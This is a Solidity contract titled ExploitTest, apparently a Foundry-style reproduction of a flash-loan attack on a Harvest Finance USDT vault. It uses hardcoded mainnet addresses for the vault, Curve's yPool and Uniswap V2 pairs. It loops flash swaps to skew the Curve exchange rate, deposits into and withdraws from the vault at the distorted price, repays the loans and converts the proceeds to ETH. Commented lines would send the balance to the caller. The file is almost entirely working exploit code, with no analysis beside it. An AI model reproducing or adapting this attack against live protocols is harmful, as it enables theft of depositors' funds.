
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./interfaces/IFlashLoanReceiver.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/IUniswapV2Router02.sol";

interface HVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

interface yCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract ExploitTest {
    event Log(string message, uint256 val);

    // ethAddress
    address constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // HVault
    HVault constant FARM_USDT = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    
    // CurveStrategy
    address constant CURVE_STRATEGY = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
    
    // yCurve
    yCurve constant Y_CURVE = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    IUniswapV2Pair constant uUSDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant uUSDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    

    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Uniswap V2 Factory 주소
    
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    

    address private constant _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Pair private pair;
    IUniswapV2Router02 public uniswapRouter;


    function uniswapSwap(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        USDC.approve(address(uniswapRouter), _amountIn);
        USDC.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WETH pair
        (uint256 reserveUSDC, uint256 reserveWETH, ) = pair.getReserves();

        // Calculate the amount of WETH to receive
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }


    constructor() {
        
        
        pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(_USDC), address(_WETH)));
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);


        // vm.startBroadcast();
        USDC.approve(address(uUSDC), ~uint256(0));
        USDC.approve(address(FARM_USDT), ~uint256(0));
        USDC.approve(address(Y_CURVE), ~uint256(0));
        USDC.approve(address(this), ~uint256(0));


        USDT.approve(address(uUSDT), ~uint256(0));
        USDT.approve(address(FARM_USDT), ~uint256(0));
        USDT.approve(address(Y_CURVE), ~uint256(0));
        USDT.approve(address(this), ~uint256(0));
    }

    function testExploit() public {
        

        // 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e test

        uint amount = 10000000 * 1e6;
    
        bytes memory data = abi.encode(uUSDC, msg.sender);
        for (uint8 i = 0; i < 19; i++) {

            // usdc transfer balance
            uUSDC.swap(
                amount,
                0,
                address(this),
                data
            );
            uniswapSwap(USDC.balanceOf(address(this)));
        }

        // deposit
        IWETH(address(WETH)).withdraw(WETH.balanceOf(address(this)));
        // payable(address(tx.origin)).call{value: address(this).balance}("");
        // payable(tx.origin).transfer(address(this).balance);
        emit Log("balance:CA", address(this).balance);
        emit Log("balance:EOA", address(tx.origin).balance);

    }
 
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (address(msg.sender) == address(uUSDT)) {
            // USDT -> USDC
            Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
            FARM_USDT.withdraw(FARM_USDT.balanceOf(address(this)));
            USDT.transfer(address(uUSDT), amount1 * 1.00301 ether / 1 ether);
            
        } else if (address(msg.sender) == address(uUSDC)) {
            // USDC -> USDT
            Y_CURVE.exchange_underlying(1, 2, 10000000 * 1e6, 0);
            uint256 usdtBalance = USDT.balanceOf(address(this));
            FARM_USDT.deposit(USDT.balanceOf(address(this)));
            // flash swap USDT
            bytes memory data = abi.encode(uUSDT, msg.sender);
            uUSDT.swap(0, usdtBalance, address(this), data);
            Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
            USDC.transfer(address(uUSDC), amount0 * 1.00301 ether / 1 ether);
    
        }
    }
    fallback () external payable {
        emit Log("receive", msg.value);
    }
}
